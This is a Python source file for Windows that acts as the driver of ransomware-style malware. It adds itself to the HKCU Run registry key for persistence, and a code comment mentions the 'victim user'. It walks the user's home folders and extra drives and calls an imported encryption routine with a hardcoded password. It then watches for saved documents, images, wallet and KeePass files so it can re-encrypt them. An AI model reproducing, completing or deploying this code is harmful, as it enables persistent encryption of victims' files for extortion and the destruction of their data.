import sys
import os
import time
import pathlib
import winreg
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from main import run


EXCLUDED_TOP_LEVEL = {
    '$RECYCLE.BIN',
    'System Volume Information',
    'Windows',
    'Program Files',
    'Program Files (x86)',
    'ProgramData',
    'PerfLogs',
    '$WinREAgent',
    'Recovery',
    'hiberfil.sys',
    'pagefile.sys',
    'swapfile.sys',
}

EXCLUDED_SUBSTRINGS_ANYWHERE = {
    r'\Windows\WinSxS',
    r'\Windows\Temp',
    r'\Windows\Prefetch',
    r'\Windows\Logs',
    r'\Windows\SoftwareDistribution',
    r'\AppData\Local\Temp',
    r'\AppData\Local\Microsoft\Windows\Explorer',
    r'\OneDrive\.onedrive',
}

ENCRYPT_PASSWORD = "ThePasswordthatTheNaughtyGuyOnceAGoodBoy"
DEFAULT_MODE = "1"

def should_skip(path: pathlib.Path) -> bool:
    """Return True if we should **not** watch / process this path"""
    name = path.name.lower()

    if name in EXCLUDED_TOP_LEVEL:
        return True

    str_path = str(path).lower()
    for bad in EXCLUDED_SUBSTRINGS_ANYWHERE:
        if bad.lower() in str_path:
            return True

    try:
        test = path / ".probe"
        test.touch()
        test.unlink()
    except (PermissionError, OSError):
        return True

    return False


def get_interesting_roots() -> list[pathlib.Path]:
    """Return list of top-level folders we want to watch recursively"""
    roots = []

    user = pathlib.Path.home()
    roots.append(user)

    candidates = [
        user / "Desktop",
        user / "Documents",
        user / "Downloads",
        user / "Pictures",
        user / "Videos",
        user / "OneDrive",
        user.parent / "Public",
    ]

    # check for other drives also
    for letter in "DEFG":
        p = pathlib.Path(f"{letter}:\\")
        if p.exists():
            candidates.append(p)

    for p in candidates:
        if p.exists() and not should_skip(p):
            roots.append(p)

    return sorted(set(roots)) 

def add_to_startup_hkcu(silent: bool = True):
    app_name = "DarkMatter" # change the name because it'll be visible to victim user in their regedit

    if getattr(sys, 'frozen', False):
        target = sys.executable
    else:
        target = f'"{sys.executable}" "{os.path.abspath(__file__)}"'

    if not (target.startswith('"') and target.endswith('"')):
        target = f'"{target}"'

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            key_path,
            0,
            winreg.KEY_READ | winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
        )

        try:
            existing, _ = winreg.QueryValueEx(key, app_name)
            if os.path.normcase(existing.strip('"')) == os.path.normcase(target.strip('"')):
                winreg.CloseKey(key)
                return 
        except FileNotFoundError:
            pass

        winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, target)
        winreg.CloseKey(key)

        if not silent:
            print(f"[+] Registered autostart (HKCU): {app_name}")

    except PermissionError as e:
        if not silent:
            print(f"[!] HKCU Run key access denied: {e}")
            print("   → Possible causes: corporate policy, AV/EDR blocking, broken profile")
    except Exception as e:
        if not silent:
            print(f"[-] Autostart failed: {type(e).__name__}: {e}")

EXCLUDED_DIRS = {   
    ".git", "__pycache__", ".venv", "venv", "env",
    "node_modules", "build", "dist"
}

class SaveHandler(FileSystemEventHandler):
    def __init__(self):
        self.last_run = 0
        self.processed = set()       

    def on_any_event(self, event):

        if event.is_directory:
            return

        if not any(event.src_path.lower().endswith(x) for x in [".txt",".doc",".pdf",".xlsx",".wallet",".kdbx",".json",".jpeg",".jpg",".png"]):
            return

        now = time.time()
        if now - self.last_run < 3:
            return

        self.last_run = now
        self.execute_on_interesting_folders()

    def execute_on_interesting_folders(self):
        for folder in get_interesting_roots():
            str_folder = str(folder.resolve())
            if str_folder in self.processed:
                continue
            self.safe_execute(folder)
            self.processed.add(str_folder)

    def safe_execute(self, folder: pathlib.Path):
        if should_skip(folder):
            return

        # choice = os.getenv("DEFAULT_MODE", "1")
        # password = os.getenv("ENCRYPT_PASSWORD")
        # if not password:
        #     print("[!] ENCRYPT_PASSWORD not set – skipping")
        #     return

        try:
            print(f"[+] Running on: {folder}")
            run(DEFAULT_MODE, str(folder.resolve()), ENCRYPT_PASSWORD)
        except Exception as e:
            print(f"[-] Failed on {folder}: {e}")


if __name__ == "__main__":
    add_to_startup_hkcu(silent=True)

    # Initial run on interesting folders :)
    for folder in get_interesting_roots():
        try:
            if not should_skip(folder):
                print(f"[INIT] Processing: {folder}")
                run(os.getenv("DEFAULT_MODE", "1"), str(folder.resolve()), os.getenv("ENCRYPT_PASSWORD"))
        except Exception as e:
            print(f"[!] Init failed on {folder}: {e}")


    observer = Observer()

    handler = SaveHandler()

    for path in get_interesting_roots():
        if should_skip(path):
            print(f"[i] Skipping watch: {path}")
            continue
        print(f"[*] Scheduling recursive watch → {path}")
        observer.schedule(handler, str(path), recursive=True)

    observer.start()
    print("[*] Folder watcher active on selected user roots. Ctrl+C to stop.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        observer.stop()

    observer.join()